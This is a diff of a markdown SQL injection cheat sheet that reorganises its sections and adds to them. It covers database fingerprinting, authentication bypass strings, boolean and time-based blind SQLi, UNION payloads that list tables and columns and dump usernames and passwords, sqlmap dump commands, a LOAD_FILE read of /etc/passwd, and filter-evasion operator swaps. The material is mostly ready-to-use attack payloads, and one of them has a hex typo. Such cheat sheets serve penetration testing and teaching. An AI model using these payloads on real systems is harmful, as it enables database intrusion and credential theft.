@@ -202,6 +202,8 @@ MySQL                                                              // FINGERPRIN
 Postgres
    http://www.example.com/news.php?id=1 AND 1=1::int               // via. typecast
    http://www.example.com/news.php? id=1 AND 'a'='a'||'a'          // via. Postgres concat
+   http://www.example.com/news.php? id=1
+   SELECT version()                                                // via. db version
 
 If !MySQL and !Postgres, most likely SQLite:
    http://www.sqlitetutorial.net/sqlite-cheat-sheet   OR
@@ -218,19 +220,6 @@ Sqlite (db.sqlite_master)
   SELECT name FROM sqlite_master WHERE type='table';
 ```
 
-Read files:
-```
-SELECT LOAD_FILE('/etc/passwd');
-```
-
-Logic Alternatives:
-```
-and -> &&
-or -> ||
-= -> like
-!= -> not like
-```
-
 Authentication Bypass:
 ```
 Auth Form Bypass Example: SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
@@ -244,25 +233,28 @@ Other things try:
   ' or '1'='1 --
 ```
 
-Logic Testing / Boolean Blind SQLi
 ```
-page.asp?id=1 or 1=1 -- true
-page.asp?id=1' or 1=1 -- true
-page.asp?id=1" or 1=1 -- true
-page.asp?id=1 and 1=2 -- false
-```
-
-Verification: Blind SQLi
-```
-%' AND 1=1 AND '%'='                  // BOOLEAN: TRUE
-%' AND 1=0 AND '%'='                  // BOOLEAN: FALSE
-company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED
+Blind SQLi (Boolean / Time-based)
+    %' AND 1=1 AND '%'='                  // BOOLEAN: TRUE
+    %' AND 1=0 AND '%'='                  // BOOLEAN: FALSE
+    company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED   
+    page.asp?id=1 or 1=1 -- true
+    page.asp?id=1' or 1=1 -- true
+    page.asp?id=1" or 1=1 -- true
+    page.asp?id=1 and 1=2 -- false
 ```
 
 Select/Union (Exfiltrating data):
 ```
-ns.agency/stuff.php?id=3 order by 1
+ns.agency/stuff.php?id=3 order by 1                                  
+ns.agency/stuff.php?id=0' union select 1,version(),database()--    // (MySQL) version + db name
 
+// (MySQL) list names of tables within the current database [result=emails, referers, uagents, users]
+ns.agency/stuff.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()--
+// (MySQL) list names of columns within the "users" table [result=id, username, password]
+ns.agency/stuff.php?id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name="users"--
+// (MySQL) list id:user:password values within the "users" table [result=id, username, password] [result=1:admin:admin]
+ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users--
 ```
 
 Insert:
@@ -282,6 +274,20 @@ $ python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?c
 
 Enumerate a specific database:
 $ python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
+```
+
+Other things:
+```
+Read Files (MySQL)
+   SELECT LOAD_FILE('/etc/passwd');
+
+Logic Altneratives (bypass filters etc.)
+   and -> &&
+   or -> ||
+   = -> like
+   != -> not like
+   
+
 ```
 
 ---
